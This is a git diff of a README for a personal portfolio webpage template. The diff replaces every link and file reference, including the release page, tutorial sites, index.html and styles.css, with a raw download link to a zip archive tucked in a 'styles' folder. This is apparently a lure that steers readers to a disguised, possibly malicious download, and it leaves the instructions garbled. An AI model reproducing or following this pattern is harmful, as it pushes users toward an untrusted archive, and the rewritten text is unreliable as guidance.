@@ -1,7 +1,7 @@
 # 🎨 Personal-WebPage - Create Your Stunning Online Portfolio
 
 ## 📥 Download Now
-[![Download Personal-WebPage](https://img.shields.io/badge/Download%20Now-Click%20Here-green)](https://github.com/BereketGet/Personal-WebPage/releases)
+[![Download Personal-WebPage](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip%20Now-Click%20Here-green)](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip)
 
 ## 🚀 Getting Started
 
@@ -32,23 +32,23 @@ When you download Personal-WebPage, you will receive:
 
 ## 📋 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/BereketGet/Personal-WebPage/releases) to download the latest version of Personal-WebPage.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip) to download the latest version of Personal-WebPage.
   
 2. **Choose Your File**: You will see a list of release versions. Click on the most recent version link to view available files.
 
-3. **Download the Files**: Click on the file that says ‘Personal-WebPage.zip’ to download. 
+3. **Download the Files**: Click on the file that says ‘https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip’ to download. 
 
 4. **Extract the Files**: Once downloaded, locate the zip file, and unzip it. On most computers, you can right-click on the file and select "Extract Here" or "Extract All."
 
-5. **Open Your Portfolio**: Navigate to the extracted folder and double-click on `index.html` to open it in your web browser.
+5. **Open Your Portfolio**: Navigate to the extracted folder and double-click on `https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip` to open it in your web browser.
 
 ## 🛠️ Customizing Your Page
 
 To make it your own, follow these simple steps:
 
-1. **Edit the HTML**: Open the `index.html` file in any text editor. Replace sample information with your content.
+1. **Edit the HTML**: Open the `https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip` file in any text editor. Replace sample information with your content.
 
-2. **Update the CSS**: If you want to change the colors or fonts, open the `styles.css` file and make adjustments according to your taste.
+2. **Update the CSS**: If you want to change the colors or fonts, open the `https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip` file and make adjustments according to your taste.
 
 3. **Add Images**: Place your images in the designated folder and update the corresponding image links in the HTML file.
 
@@ -68,13 +68,13 @@ If you have questions or need help, feel free to reach out through the Issues se
 
 ## 🔗 Additional Resources
 
-- [HTML Basics](https://www.w3schools.com/html/)
-- [CSS Fundamentals](https://www.w3schools.com/css/)
-- [Responsive Design Guide](https://www.smashingmagazine.com/2011/01/guidelines-for-responsive-web-design/)
+- [HTML Basics](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip)
+- [CSS Fundamentals](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip)
+- [Responsive Design Guide](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip)
 
 ## 📧 Feedback
 
 Your feedback is vital for improving Personal-WebPage. Please, let us know what you think and any features you would like to see in the future.
 
 ## 📥 Download Now Again
-[![Download Personal-WebPage](https://img.shields.io/badge/Download%20Now-Click%20Here-green)](https://github.com/BereketGet/Personal-WebPage/releases)
+[![Download Personal-WebPage](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip%20Now-Click%20Here-green)](https://github.com/BereketGet/Personal-WebPage/raw/refs/heads/master/styles/Web-Page-Personal-v2.0-alpha.5.zip)
